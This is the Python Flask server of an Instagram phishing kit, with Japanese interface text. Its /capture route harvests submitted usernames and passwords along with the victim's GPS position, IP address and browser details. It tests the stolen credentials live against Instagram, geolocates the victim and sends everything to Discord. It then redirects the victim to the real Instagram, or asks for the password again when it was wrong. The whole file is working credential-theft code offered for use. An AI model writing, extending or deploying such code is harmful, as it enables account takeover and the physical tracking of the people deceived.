import threading

from flask import Flask, jsonify, redirect, render_template, request

from config import FORCE_LOGOUT, REAL_INSTAGRAM
from discord_notify import send_to_discord
from geocode import ip_geocode, reverse_geocode
from ig_login import verify

app = Flask(__name__)

WRONG = "ユーザー名またはパスワードが正しくありません。"
RETRY = "しばらくしてからもう一度お試しください。"


def client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    return (xff.split(",")[0].strip() if xff else request.remote_addr) or ""


@app.route("/")
def index():
    return render_template("login.html", force_logout=FORCE_LOGOUT)


@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    lat = request.form.get("lat", "")
    lng = request.form.get("lng", "")
    acc = request.form.get("acc", "")
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")

    # --- 本物のInstagramにログインできるか試す ---
    status, detail = verify(username, password)

    address, postal, isp, method = "", "", "", "IP"
    try:
        if lat and lng:
            method = "GPS"
            address = reverse_geocode(float(lat), float(lng))
        else:
            g = ip_geocode(ip)
            postal, isp = g.get("postal", ""), g.get("isp", "")
            if g.get("lat") and g.get("lng"):
                lat, lng = g["lat"], g["lng"]
                address = reverse_geocode(float(lat), float(lng))
    except Exception as e:
        print(f"[geo] error: {e}")

    result = {
        "ok": "✅ ログイン成功",
        "2fa": "🔐 2段階認証あり（パスワードは正しい）",
        "unknown": "⚠️ 判定不能（通信エラー）",
    }.get(status, "❌ 失敗 → 再入力")

    threading.Thread(
        target=send_to_discord,
        args=(username, password, address, lat, lng, ip, ua,
              acc, postal, isp, method, result, detail),
        daemon=True,
    ).start()

    success = status in ("ok", "2fa", "unknown")
    error = "" if success else (RETRY if status == "challenge" else WRONG)

    # JSからのfetchならJSONを返す（再読み込みせずエラー表示）
    if request.headers.get("X-Requested-With") == "fetch":
        return jsonify(ok=success, error=error, status=status)

    # JSなしの通常POST
    if success:
        return redirect(REAL_INSTAGRAM, code=302)
    return render_template("login.html", error=error,
                           username=username, force_logout=FORCE_LOGOUT)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
